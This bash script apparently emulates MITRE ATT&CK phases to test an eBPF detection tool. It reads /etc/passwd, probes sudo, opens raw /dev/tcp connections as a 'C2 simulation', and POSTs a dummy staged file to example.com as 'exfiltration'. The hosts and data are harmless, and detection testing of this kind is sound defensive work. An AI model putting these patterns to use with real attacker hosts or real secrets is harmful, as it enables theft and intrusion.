#!/usr/bin/env bash
set -e

echo "[*] MITRE ATT&CK emulation starting..."

########################################
# PHASE 1 - INITIAL ACCESS
########################################
echo "[Phase 1] Initial Access (simulated execution entry)"

# benign foothold simulation
echo "user session started"
sleep 1

########################################
# PHASE 2 - EXECUTION
# T1059: Command Interpreter
########################################
echo "[Phase 2] Execution (trigger suspicious comms)"

ping -c 1 8.8.8.8 > /dev/null || true
curl -s http://example.com > /dev/null || true
wget -q http://example.com -O /dev/null || true

sleep 1

########################################
# PHASE 3 - DISCOVERY
# T1083: File & system discovery
########################################
echo "[Phase 3] Discovery (/etc/passwd access)"

cat /etc/passwd > /dev/null
ls /etc > /dev/null
whoami
id

sleep 1

########################################
# PHASE 4 - PRIVILEGE CONTEXT CHECK
########################################
echo "[Phase 4] Privilege probing"

sudo -n true 2>/dev/null || true
groups

sleep 1

########################################
# PHASE 5 - C2 / NETWORK BEHAVIOR
# T1071: Application Layer Protocol
########################################
echo "[Phase 5] C2 simulation (socket_connect triggers)"

curl http://example.com > /dev/null || true

# raw TCP connect (bypasses HTTP abstraction)
bash -c "exec 3<>/dev/tcp/1.1.1.1/80" || true
bash -c "exec 3<>/dev/tcp/8.8.8.8/443" || true

sleep 1

########################################
# PHASE 6 - DNS (should be filtered in your eBPF)
########################################
echo "[Phase 6] DNS noise (should be ignored by kernel filter)"

nslookup google.com > /dev/null || true
dig example.com > /dev/null || true

sleep 1

########################################
# PHASE 7 - SIMULATED EXFILTRATION
########################################
echo "[Phase 7] Exfiltration simulation"

echo "sensitive_data=12345" > /tmp/staging.dat
curl -s -X POST http://example.com/upload -d @/tmp/staging.dat > /dev/null || true

rm -f /tmp/staging.dat

echo "[*] MITRE emulation complete"
